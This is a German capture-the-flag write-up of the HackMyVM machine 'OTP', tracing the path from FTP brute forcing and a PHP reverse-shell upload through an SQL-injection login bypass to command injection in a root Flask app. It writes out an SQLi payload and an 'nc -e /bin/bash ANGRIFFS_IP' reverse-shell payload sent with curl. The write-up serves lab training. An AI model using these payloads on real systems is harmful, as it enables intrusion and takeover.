# OTP - HackMyVM (Hard)

![OTP.png](OTP.png)

## Übersicht

*   **VM:** OTP
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=OTP)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 12. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/OTP_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "OTP" zu erlangen. Der Weg dorthin führte über mehrere Stufen: Zuerst wurde ein virtueller Host (`argon.otp.hmv`) entdeckt, dessen Webseite HTML-Kommentare mit Credentials (`otpuser:#4ck!ng!s!nMybl0od`) enthielt. Parallel wurde über einen fehlkonfigurierten FTP-Dienst (kein chroot jail für Benutzer `david`, dessen Passwort `DAVID` erraten wurde) die Datei `/etc/passwd` heruntergeladen und das Web-Root-Verzeichnis `argon.otp.hmv` als beschreibbar identifiziert. Eine PHP-Reverse-Shell wurde hochgeladen und ausgeführt, was zu Zugriff als `www-data` führte. Als `www-data` wurde ein SQL-Dump (`creds.sql`) mit einem Base32-kodierten String gefunden, der nach Dekodierung das Passwort für den Benutzer `avijneyam` enthielt (`n3v3rG0nn4G!v3y0UuP`). Eine SQL-Injection-Schwachstelle auf einem weiteren VHost (`totp.otp.hmv`) bestätigte diese Credentials. Nach dem Wechsel zu `avijneyam` wurde eine `sudo`-Regel entdeckt, die das Ausführen eines Python Flask-Skripts (`/root/localhost.sh`) als Root erlaubte. Der Quellcode dieser Flask-Anwendung (erreichbar über einen `/SourceCode`-Endpunkt nach Port-Forwarding mit `socat`) offenbarte eine Command Injection-Schwachstelle, die zur finalen Root-Eskalation genutzt wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `fping`
*   `dirsearch`
*   `wfuzz`
*   `cat`
*   `vi` (implizit)
*   Browser (impliziert)
*   `hydra`
*   `ftp`
*   `grep`
*   `nc` (netcat)
*   Python3 (`http.server`, `pty` Modul)
*   `stty`
*   `dcode.fr` (externes Tool)
*   `emn178.github.io` (externes Tool)
*   `su`
*   `passwd`
*   `ls`
*   `sudo`
*   `socat`
*   `curl`
*   `base64`
*   `ffuf`
*   Standard Linux-Befehle (`id`, `export`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "OTP" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web/FTP Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.144 – Abweichung vom ARP-Scan, der .133 fand) identifiziert.
    *   `nmap`-Scan offenbarte Port 21 (FTP, vsftpd 3.0.3), 22 (SSH, OpenSSH 7.9p1), 80 (HTTP, Apache 2.4.38) und 5000 (HTTP, Werkzeug httpd 1.0.1 / Python 3.7.3).
    *   Port 80 (Apache) zeigte keine signifikanten Funde. Anonymer FTP-Login auf Port 21 war erfolgreich.
    *   Mittels `wfuzz` VHost-Enumeration wurde `argon.otp.hmv` entdeckt und in `/etc/hosts` eingetragen.
    *   Auf `http://argon.otp.hmv/profile.html` wurden im HTML-Quellcode Credentials gefunden: `otpuser`:`#4ck!ng!s!nMybl0od`.
    *   Auf `http://argon.otp.hmv/cr3d5_123.html` wurde der Benutzername `david` entdeckt.

2.  **FTP Exploitation & Initial Access (Webshell als `www-data`):**
    *   Mit `hydra` wurde das FTP-Passwort für `david` zu `DAVID` gebruteforced.
    *   FTP-Login als `david:DAVID`. Es wurde festgestellt, dass der Benutzer nicht in sein Home-Verzeichnis (`/srv/ftp`) gechrootet war. `/etc/passwd` wurde heruntergeladen, was die Benutzer `avijneyam` und `david` bestätigte.
    *   Das Web-Root-Verzeichnis `/var/www/otp/argon/u9l04d_` wurde als für alle beschreibbar identifiziert.
    *   Eine PHP-Reverse-Shell (`image.php`) wurde über FTP in dieses Verzeichnis hochgeladen.
    *   Durch Aufrufen von `http://argon.otp.hmv/u9l04d_/image.php` wurde eine Reverse Shell als `www-data` zu einem Netcat-Listener (Port 9001) aufgebaut und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `avijneyam` via SQL Dump & SQLi):**
    *   Als `www-data` wurde im Verzeichnis `/opt` die Datei `creds.sql` gefunden (lesbar für `www-data`).
    *   `creds.sql` enthielt einen Base32-kodierten String (`NYZX...UAK`), der zu `n3v3rG0nn4G!v3y0UuP` dekodiert wurde.
    *   Eine Apache-Konfigurationsdatei (`/etc/apache2/sites-available/totp.conf`) enthüllte den VHost `totp.otp.hmv`. Dieser wurde in `/etc/hosts` eingetragen.
    *   Auf `http://totp.otp.hmv` führte eine SQL-Injection (`' or 1=1 -- -`) im Login- und OTP-Formular zum Zugriff auf `cr3d54695.html`.
    *   Diese Seite enthielt das vollständige Passwort für `avijneyam`: `n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)`.
    *   Mit `su avijneyam` und diesem Passwort wurde erfolgreich zum Benutzer `avijneyam` gewechselt.
    *   Die User-Flag (`2990aa5108d5803f3fdca99c277ba352`) wurde in `/home/avijneyam/flag_user.txt` gefunden.

4.  **Privilege Escalation (von `avijneyam` zu `root` via Flask RCE):**
    *   `sudo -l` als `avijneyam` zeigte, dass das Skript `/root/localhost.sh` als `root` mit Passwort ausgeführt werden durfte (`(root) PASSWD: /bin/bash /root/localhost.sh`).
    *   Das Skript startete einen Python Flask-Entwicklungsserver auf `127.0.0.1:5000`.
    *   Mittels `socat tcp-listen:3333,fork tcp:127.0.0.1:5000 &` wurde der Flask-Server auf Port 3333 extern erreichbar gemacht.
    *   `dirsearch` auf `http://ZIEL_IP:3333/` fand den Endpunkt `/SourceCode`.
    *   `/SourceCode` gab den Base64-kodierten Quellcode der Flask-Anwendung zurück.
    *   Der dekodierte Quellcode zeigte eine Command Injection-Schwachstelle: Die Anwendung nahm PUT-Requests auf `/` mit einem JSON-Body entgegen. Der Wert des leeren JSON-Keys (`""`) wurde direkt an `subprocess.Popen` mit `shell=True` übergeben.
    *   Ein JSON-Payload (`{"": "nc -e /bin/bash ANGRIFFS_IP 5555"}`) wurde per `curl -X PUT` an `http://ZIEL_IP:3333/` gesendet.
    *   Eine Root-Shell wurde auf einem Netcat-Listener (Port 5555) empfangen.
    *   Die Root-Flag (`8a2d55707a9084982649dadc04b426a0`) wurde in `/root/flag_r00t.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Fehlkonfigurierter FTP-Server (kein chroot):** Erlaubte das Navigieren im Dateisystem und das Herunterladen von `/etc/passwd`.
*   **Global beschreibbares Verzeichnis im Web-Root:** Ermöglichte das Hochladen einer Webshell via FTP.
*   **Information Disclosure:**
    *   Credentials (`otpuser`, MD5-Hash für `admin`) im HTML-Quellcode.
    *   Base32-kodierter String (Teil eines Passworts) in einem SQL-Dump (`creds.sql`).
    *   Vollständiges Passwort für `avijneyam` auf einer Webseite nach SQLi-Bypass.
    *   Quellcode der Flask-Anwendung über einen speziellen Endpunkt (`/SourceCode`).
*   **SQL Injection:** Mehrstufige SQLi zum Umgehen von Login- und OTP-Mechanismen.
*   **Unsichere `sudo`-Regel (Skriptausführung):** Erlaubte `avijneyam`, ein Skript als `root` auszuführen, das einen Webserver startete.
*   **Command Injection in Flask-Anwendung:** Die als Root laufende Flask-Anwendung nahm Benutzereingaben entgegen und führte sie unsicher als Shell-Befehle aus.
*   **VHost Enumeration:** Auffinden der VHosts `argon.otp.hmv` und `totp.otp.hmv`.

## Flags

*   **User Flag (`/home/avijneyam/flag_user.txt`):** `2990aa5108d5803f3fdca99c277ba352`
*   **Root Flag (`/root/flag_r00t.txt`):** `8a2d55707a9084982649dadc04b426a0`

## Tags

`HackMyVM`, `OTP`, `Hard`, `FTP Misconfiguration`, `LFI` (impliziert durch FTP), `File Upload RCE`, `Information Disclosure`, `SQL Injection`, `Base32`, `sudo Exploit`, `Flask RCE`, `Command Injection`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `vsftpd`, `Werkzeug`
